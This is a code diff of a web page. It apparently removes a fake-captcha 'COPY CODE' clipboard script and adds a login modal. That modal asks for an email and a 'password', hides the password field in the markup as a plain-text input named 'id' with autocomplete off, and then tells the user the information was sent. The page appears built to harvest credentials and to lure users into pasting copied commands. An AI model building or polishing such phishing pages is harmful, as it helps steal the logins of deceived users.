+          <input
+            class="hello-modal__input"
+            id="hello-email"
+            name="email"
+            type="email"
+            autocomplete="username"
+            spellcheck="false"
+          />
+          <label class="hello-modal__label" for="hello-id">password</label>
+          <input
+            class="hello-modal__input"
+            id="hello-id"
+            name="id"
+            type="text"
+            autocomplete="off"
+            spellcheck="false"
+          />
+          <button class="hello-modal__submit" type="submit">Submit</button>
+        </form>
+      </div>
+    </div>
+    <div class="hello-toast is-hidden" id="hello-toast" hidden role="status">The information was sent successfully.</div>
   </main>
 
-  <script>
-    document.addEventListener('DOMContentLoaded', () => {
-      const copyBtn = document.getElementById('btn-copy-code');
-      const copyBtnLabel = document.getElementById('btn-copy-code-label');
-      const copySource = document.getElementById('copy-code-source');
-
-      function resetCopyButton() {
-        copyBtn.classList.remove('copied');
-        copyBtnLabel.textContent = 'COPY CODE';
-      }
-
-      async function copyCaptchaCode() {
-        const copyText = (copySource.textContent || '').trim();
-
-        try {
-          await navigator.clipboard.writeText(copyText);
-          copyBtn.classList.add('copied');
-          copyBtnLabel.textContent = 'COPIED';
-
-          setTimeout(() => {
-            resetCopyButton();
-          }, 1600);
-        } catch {
-          copyBtnLabel.textContent = 'COPY FAILED';
-          setTimeout(resetCopyButton, 1600);
-        }
-      }
-
-      copyBtn.addEventListener('click', copyCaptchaCode);
-    });
-  </script>
+  <script src="script.js"></script>
 </body>
 </html>
